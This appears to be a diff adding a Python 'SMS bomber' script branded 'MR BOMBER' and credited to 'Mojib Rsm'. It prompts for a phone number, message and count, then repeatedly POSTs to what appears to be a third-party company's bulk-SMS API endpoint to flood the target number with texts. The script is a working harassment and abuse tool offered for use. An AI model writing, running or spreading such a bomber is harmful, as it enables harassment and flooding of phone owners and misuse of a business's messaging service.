@@ -1,0 +1,114 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+import os
+
+import sys
+
+import time
+os.system("clear")
+
+
+#Color Value
+red="\033[0;31m"          # Red
+
+yellow="\033[0;33m"       # Yellow
+
+green="\033[0;32m"        # Green
+
+color_off="\033[0m"       # Text Reset
+
+bblack="\033[1;30m"       # Black
+
+bred="\033[1;31m"         # Red
+
+ured="\033[4;31m"         # Red
+
+on_green="\033[42m"       # Green
+
+blue="\033[0;34m"         # Blue
+
+lightblue = '\033[94m'
+
+red = '\033[91m'
+
+white = '\33[97m'
+
+yellow = '\33[93m'
+
+green = '\033[1;32m'
+
+cyan  = "\033[96m"
+
+end = '\033[0m'
+
+purple="\033[0;35m"
+
+
+
+
+
+cnt=(green+ """                     
+   ╔═══════════════════════=══=════════╗
+   	 Author   : MoJiB Rsm
+  	 Facebook : MoJiB Rsm       								
+ 	 Github   : Mojib-Rsm
+ 	 YouTube  : Mojib Rsm
+ 	    
+   ╚═══════════════════==══════════════╝  
+""")
+
+
+
+
+line=(yellow+"======================================================")
+
+line2=(lightblue+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
+ 
+dtls=(yellow+"\n\t\t Created By: Mojib Rsm")
+
+MrBomber=(purple+"\n\t\t      MR BOMBER \n ")
+
+
+
+#PrinT
+print(cnt)
+print(" ")
+print(dtls)
+print(MrBomber)
+print(line2)
+
+
+
+
+
+print(' ')
+
+
+
+url = "https://v2.api.esquireelectronicsltd.com/api/bulk-sms/sent-bulk-sms-by-ssl"
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+
+number  = str(input(cyan+"\n\n\t[>] Your Number : "))
+
+sms  = str(input(bblack+"\t[>] Your Message : ")) 
+
+amount = int(input(yellow+"\t[>] Sms Amount : "))
+
+data = {
+  "sms": sms,
+  "csmsid": number,
+  "msisdn": number
+}
+
+for i in range(amount):
+	try:
+            resp = requests.post(url, headers=headers, json=data)
+            
+            print(str (i+1)+ green+"\n\t Sms Sent✌️ \n")
+		
+	except:
+		print (red+" \n\t Not Sent 😩")
+		print('					')
+print(cyan+'Thanks For Using Mr_Bomber Bangladesh By Mojib Rsm - {Team Tiger} ')
